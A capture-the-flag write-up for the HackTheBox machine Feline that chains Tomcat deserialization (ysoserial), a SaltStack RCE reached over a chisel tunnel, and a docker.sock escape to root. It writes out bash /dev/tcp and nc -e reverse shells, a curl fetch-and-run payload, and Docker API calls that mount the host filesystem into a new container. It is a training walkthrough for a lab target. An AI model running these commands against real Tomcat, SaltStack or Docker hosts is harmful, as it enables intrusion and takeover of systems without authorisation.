---
layout: post
title: "Feline - HackTheBox"
color: rgb(130, 10, 34)
permalink: "/feline-hackthebox"
excerpt_separator: <!--more-->
author: ritiksahni
tags: [HackTheBox, Docker, API, Deserialization]
---

<center><img src="assets/img/posts/feline-htb/room_header.png"></center>

Feline is a super fun box created by [MinatoTW](https://twitter.com/MinatoTW_) and [MrR3boot](https://twitter.com/MrR3boot), two hackers I admire a lot for their work. Give them a follow on their twitter profiles! This box takes us through exploiting a java deserialization in a custom web application hosted on an Apache Tomcat server to exploiting an RCE in **SaltStack** to gain a shell inside a docker container, and finally getting root on host by exploiting an exposed **docker.sock** file.

<!--more-->

## Contents <a name="top">
* [Port Scanning](#port-scanning)
* [Web (Port 8080)](#web)
  * [Exploitation](#exploitation)
* [Privilege Escalation](#privesc)
  * [Understanding the Exploit](#understanding-exploit)
* [Docker Breakout](#docker-breakout)
  * [Understanding /var/run/docker.sock](#understanding-sock)

## Port Scanning <a name="port-scanning">

```
# Nmap 7.80 scan initiated Sun Jan 17 06:38:48 2021 as: nmap -sV -sC -sT -p 22,8080 -oA nmap/initial 10.10.10.205
Nmap scan report for 10.10.10.205
Host is up (0.28s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat 9.0.27
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: VirusBucket
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 17 06:39:02 2021 -- 1 IP address (1 host up) scanned in 14.18 seconds
```

We can see that there are 2 ports open, first is SSH on port 22 and the second is HTTP on port 8080 which has Apache Tomcat 9.0.27 running.

Let's take a look at the web server at port 8080.

---

## Web (Port 8080) <a name="web">

Opening http://10.10.10.205:8080/ serves a website which says `VirusBucket`.
It appears to be an online malware analysis utility.

![virusbucket-homepage](assets/img/posts/feline-htb/virusbucket-homepage-8080.png)

In the navigation bar, we have `Blog`, `Service` and `Home`. Everything redirects to / but `Service` takes us to /service which has a form which asks for email address and a sample (file uploading functionality).

![virusbucket-service](assets/img/posts/feline-htb/virusbucket-service-8080.png)

Uploading any regular file gives us a message `Upload successful! The report will be sent via e-mail.` After spending quite some time I observed that if we upload a file with no filename, we get a stack trace error which discloses the directory where all files are uploaded.

![stack-trace](assets/img/posts/feline-htb/stack-trace.png)

While understanding the box, I landed upon a very interesting article [https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/](https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/). It tells about Java Deserialization vulnerability in Apache Tomcat (YES, we found tomcat server running as the server for VirusBucket). Following the said article, we can see the prerequisites of exploiting this deserialization vulnerability.

There are a number of prerequisites for this vulnerability to be exploitable.

- The **PersistentManager** is enabled and it’s using a FileStore
- The attacker is able to upload a file with arbitrary content, has control over the filename and knows the location where it is uploaded
- There are gadgets in the classpath that can be used for a Java deserialization attack.

I highly suggest you to read that article in order to get a better understanding.

---

#### Exploitation <a name="exploitation">

![exploit-tomcat](assets/img/posts/feline-htb/exploit-tomcat.png)

As per the above screenshot, we can change the value of "JSESSIONID" cookie to the path of our uploaded file and tomcat will find it, deserialize it and parse session information from it.


We will do that using curl but for creating serialized payloads of system commands, we can use [ysoserial](https://github.com/frohoff/ysoserial)

It has variety of payloads which we can use to create serialized payloads of system commands and we will upload that serialized payloads to virusbucket, once tomcat deserializes the payload and try to parse session information out of it, the system commands will get executed.

```bash
echo 'bash -i >& /dev/tcp/10.10.14.44/10000 0>&1' > shell.sh ; chmod +x shell.sh # Payload Data


# This creates the serialized payload. One which contains the curl command to download reverse shell script and the other to execute the reverse shell script.
java -jar /opt/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections2 "curl http://10.10.14.44:9001/shell.sh -o /tmp/shell.sh" > payload1.session
java -jar /opt/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections2 'bash /tmp/shell.sh' > revexec.session

# Using curl to send request to the server with JSESSIONID based on the exploit and uploading the serialized files in "image" parameter.
curl http://10.10.10.205:8080/upload.jsp -H "Cookie: JSESSIONID=../../../opt/samples/uploads/payload1" -F image=@payload1.session
sleep 2
curl http://10.10.10.205:8080/upload.jsp -H "Cookie: JSESSIONID=../../../opt/samples/uploads/revexec" -F image=@revexec.session
```

The above script will create serialized payloads and upload it to the server at `/opt/samples/uploads/`.

Make sure to start a web server and listener so that the payloads work. Remember, the logic of the payloads is to first download `shell.sh` from your machine and then execute it so web server, listener needs to be active when uploading files. The first line of the above script creates script.sh which has the reverse shell payload. Change the IP address and port number as per your preference before you use it.

![reverse-shell-tomcat](assets/img/posts/feline-htb/tomcat_shell.png)

We get a reverse shell!

---

## Privilege Escalation <a name="privesc">

After some basic enumeration, I saw the network connections in the box. 

![netstat](assets/img/posts/feline-htb/netstat-output.png)

We can see 2 interesting ports, 4505 and 4506...

Both the ports are of `SaltStack`. It is a automation and network management solution for enterprises so finding this sort of infrastructure in real-world environments is very much possible.

SaltStack has a few CVEs and we have to exploit a remote code execution bug to get escalate our privileges.

I stumbled across this exploit from Exploit-DB: [https://www.exploit-db.com/exploits/48421](https://www.exploit-db.com/exploits/48421) and this an RCE exploit for SaltStack 3000.1

The exploit looks for port 4505 / 4506 locally and try to do its magic there but unfortunately, the target system doesn't have the python module [salt](https://pypi.org/project/salt/) which is required by the exploit to function correctly. In this case, we can port forward 4506 using tools like chisel and run the exploit on our own machine and it will work.

**Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.**


Download [chisel](https://github.com/jpillora/chisel) on your machine and send it to the victim machine as well, using any file transferring technique.


After making sure that the target machine has `chisel`, run the following commands:

On host machine:

```bash
./chisel server --port 9080 --reverse
```

On target machine (change the IP address to your own IP):

```bash
./chisel client 10.10.14.44:9080 R:4506:127.0.0.1:4506
```

Now you should be able to run the exploit locally.

We can start a netcat listener and run our SaltStack exploit to make it run a bash reverse shell script.

On our host machine:

```bash
nc -lvnp 9003 # Any port you want
```

On target box (change the IP address to your IP):

```bash
# https://www.exploit-db.com/exploits/48421
python3 exploit.py --exec 'bash -c "bash -i >& /dev/tcp/10.10.14.44/9003 0>&1"'
```

As soon as this is done, you'll receive a shell on your netcat listener.


We are root user but we are not done yet, we got root shell inside a docker container where SaltStack is running. We still need to break out of the docker container to get root privileges on the host machine Feline.

![docker-shell](assets/img/posts/feline-htb/docker_shell.png)

First let's understand the exploit which we used to get the current shell as root in docker container.

---

#### Understanding The Exploit <a name="understanding-exploit">

A few things about **SaltStack**:

It works on [ZeroMQ](https://zeromq.org/) which is an open source embeddable networking library and Salt uses public keys for authentication with the master daemon.

It consists of two daemons **minion** and a **master**.

Role of master daemon: Communicating with minion daemon and controlling it, sending commands.
Role of minion daemon: It receives commands from the remote master daemon and replies with the result of the commands.

---

The exploit we used combines 2 different CVEs (Authentication Bypass & RCE) to do what it does (execute commands as root!)

A class in Salt which is `ClearFuncs` exposes the `_send_pub()` function which is responsible for queuing messages or commands master servers to minions and we can use that function to send arbitrary commands for minions to execute.

Another important function `_prep_auth_info()` is exposed in the same class which is responsible for returning the `root key` which is used to authenticate the commands from local root user in the master server.

Combining the flaws, we can send our commands and authenticate it using the `root key` hence executing arbitrary commands resulting in RCE.

There are several different functions in the python [exploit](https://www.exploit-db.com/exploits/48421) and we will understand how it works and execute the command we want.

- **init_minion**  
This function has a dictionary defined within itself which contains the key:value pairs of basic configuration for the exploit to work. It stores data like target IP, port, URL, directory to work within.
<br><br>

- **check_salt_version**  
This function is self-explanatory. It simply checks for SaltStack version.
<br><br>

- **check_connection**  
This function checks if the target IP and port is reachable.
<br><br>

- **check_CVE_2020_11651**  
This function gets the root key from `_prep_auth_info()` function as described above.
<br><br>

- **check_CVE_2020_11652_read_token**  
It sends **get_token** as commands and reads the token received from the minion.
<br><br>

- **check_CVE_2020_11652_read**  
It uses the `root key` (for authentication) and tries reading file data, the file paths and key is stored in `msg` dictionary in a key:value pair.
<br><br>

- **check_CVE_2020_11652_write1**  
It checks if `/tmp` path is writable or not. If yes, it deletes the file soon after it is created.
<br><br>

- **check_CVE_2020_11652_write2**  
Same as above, except this time it updates a config file to see if path is writable and soon after the check is done, the conf file is deleted.
<br><br>

- **pwn_read_file**  
It takes the specified filename and tries to read it and print the data. Remember, the above functions are "checks" and not actual exploitation but this one and the below functions will be for actual exploitation and messing around with SaltStack.
<br><br>

- **pwn_upload_file**  
It writes the file in specified directory.
<br><br>

- **pwn_exec**  
It takes help of `subprocess` python module and executes system commands on the master server.
<br><br>

- **pwn_exec_all**  
It executes system commands but this time it executes on all of the minion servers so in case there are multiple minion servers, we can use this function to execute a common command on all of the minion servers in control.
<br><br>

- **main**
It runs all of the described functions, prints stuff and presents us a way to interact and use the script based on our needs. Pretty simple :-)

---

## Privilege Escalation (Docker Breakout) <a name="docker-breakout">

Once we are inside the docker container, we can try basic docker enumeration stuff...

There is a `todo.txt` file present with the following content:

```
- Add saltstack support to auto-spawn sandbox dockers through events.
- Integrate changes to tomcat and make the service open to public.
```

Nothing interesting in particular but while going on with basic enumeration inside the docker container, I found an interesting thing, the file `/var/run/docker.sock` was exposed and we could reach out to it inside the docker container which we have access to.

I got this hint from running `history` command in the docker shell. A command was run in the container which communicated with `/var/run/docker.sock` file.

#### Understanding /var/run/docker.sock <a name="understanding-sock">

/var/run/docker.sock is a unix socket file that enables us to communicate with the Docker daemon and exchange data between the container and the host machine from which docker daemon is running.

All unix socket files allow us to communicate with a communications endpoint (in this case, it's docker) and allow exchange of  data.

Unix socket files works similar to how APIs work.


---

Now as we can see that we can communicate with docker daemon using docker.sock socket file, we can enumerate more stuff.

After trying tons of different commands, usual docker.sock things I've narrowed it down to a couple of commands which can help us get access to the host machine as root.

- Enumerating the available docker images:

```bash
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
```
<br><br>
This gives a JSON output with the data of available docker images. Output:

```
HTTP/1.1 200 OK
Api-Version: 1.40
Content-Type: application/json
Docker-Experimental: false
Ostype: linux
Server: Docker/19.03.8 (linux)
Date: Tue, 19 Jan 2021 15:03:21 GMT
Content-Length: 516

[{"Containers":-1,"Created":1590787186,"Id":"sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e","Labels":null,"ParentId":"","RepoDigests":null,"RepoTags":["sandbox:latest"],"SharedSize":-1,"Size":5574537,"VirtualSize":5574537},{"Containers":-1,"Created":1588544489,"Id":"sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9","Labels":null,"ParentId":"","RepoDigests":["<none>@<none>"],"RepoTags":["<none>:<none>"],"SharedSize":-1,"Size":1056679100,"VirtualSize":1056679100}]
```


We can see that there is an image called `sandbox`, we can spin it up and mount the `/root` directory of host machine inside the container of `sandbox` image.

Start a netcat listener to so that we get a shell of sandbox container...

```bash
nc -lvnp 9051
```


Create a new container with `sandbox` image with a reverse shell command and with a bind to mount /root directory of host to /mnt in the container. We can do that by the following command:

```bash
curl -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" http://localhost/containers/create?name=hack_feline -d '{"Image":"sandbox", "Cmd":["/usr/bin/nc", "10.10.14.44", "9051", "-e", "/bin/sh"], "Binds": [ "/:/mnt" ], "Privileged": true}'
```

We named the container `hack_feline`, you can name it whatever you want.

Now we only have to start the container and we will get a reverse shell of the container just after that because `/usr/bin/nc 10.10.14.44 9051 -e /bin/sh` will be executed as soon as we start the container.


```bash
curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/containers/hack_feline/start
```

We should receive a connection in our netcat listener, just go to /mnt/root/ and read the root.txt, we mount the / of root to /mnt of the container so that is why we can explore the whole filesystem of inside /mnt of `hack_feline`.

I really enjoyed this box very much, it had lots of new things for me to learn! 
<br>Hit me up on my socials to give feedback, suggestions for my upcoming work. [Contact Me](/contact)

[Back to Top](#top)